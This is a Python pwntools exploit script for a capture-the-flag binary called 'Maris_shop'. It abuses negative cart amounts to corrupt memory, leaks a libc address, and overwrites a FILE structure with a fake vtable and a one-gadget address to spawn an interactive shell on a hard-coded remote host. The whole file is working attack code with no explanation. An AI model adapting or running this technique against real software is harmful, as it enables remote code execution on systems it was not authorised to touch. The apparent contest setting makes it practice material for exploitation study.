from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./Maris_shop"
LIBC = "./libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
#context.log_level = "debug"

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

check_action_off = 0x3c4150

def recvmenu(conn):
    conn.recvuntil("choice:")

def addcart(conn, n, amt):
    ret = 0
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("item?:")
    conn.sendline(str(n))
    ret = 0 if conn.recv(3) == "Add" else 1
    conn.recvuntil("?:")
    conn.sendline(str(amt))
    return ret

def remcart(conn, n):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("?:")
    conn.sendline(str(n))
    return

def showcart(conn, a, c=None):
    recvmenu(conn)
    conn.sendline("3")
    recvmenu(conn)
    conn.sendline(str(a))
    if a == 1:
        conn.recvuntil("?:")
        conn.sendline(str(c))
    return

def buyitem(conn, a, c):
    recvmenu(conn)
    conn.sendline("4")
    recvmenu(conn)
    conn.sendline(str(a))
    conn.recvuntil(":")
    conn.sendline(str(c))
    return

def exploit(conn, elf, libc, local):
    addcart(conn, 1, -1000)
    buyitem(conn, 1, 0)

    x = 0
    while x != 16:
        x = x + addcart(conn, 1, 1)
    buyitem(conn, 2, 1)

    x = 0
    while x != 3:
        x = x + addcart(conn, 1, 1)
    buyitem(conn, 2, 2)

    x = 0
    while x != 15:
        x = x + addcart(conn, 1, 1)
    buyitem(conn, 1, 12)

    showcart(conn, 1, 14)
    conn.recvuntil("Name: ")
    name = conn.recvuntil("\n").strip()
    conn.recvuntil("Amount: ")
    libcleak = int(conn.recvuntil("\n").strip())
    libc.address = libcleak - 0x3c4b78
    log.info("%#x", libc.address)

    while True:
        recvmenu(conn)
        conn.sendline("1")
        x = 0
        for i in range(6):
            conn.recvuntil(". ")
            if name == conn.recvuntil("----")[:-4].strip():
                x = i + 1
                break
            conn.recvuntil("\n")
        conn.recvuntil("?:")
        conn.sendline(str(x))
        if conn.recv(3) == "Add":
            conn.sendline(str(-600 - 0x10))
            break


    showcart(conn, 2)
    conn.recvline()
    namel = []
    while True:
        x = conn.recvline().strip()
        if x == "":
            break
        namel.append(x.split(":")[1].strip())

    while True:
        recvmenu(conn)
        conn.sendline("1")
        x = 0
        for i in range(6):
            conn.recvuntil(". ")
            if conn.recvuntil("----")[:-4].strip() not in namel:
                x = i + 1
                break
            conn.recvuntil("\n")
        conn.recvuntil("?:")
        conn.sendline(str(x))
        if conn.recv(3) == "Amo":
            conn.sendline(str(1))
            break
    pause()


    lock = libc.address + 0x3c6790
    vtable = libc.address + 0x3c49c0 - 0x28
    magic = libc.address + 0xf02a4
    p = ""
    p += ("\x00"*5 + p64(lock) + p64(0)*9 + p64(vtable) + p64(magic)).ljust(0x1ad,"\x00")+ p64(magic)
    conn.sendline(p)

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("110.10.147.102", 7767)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
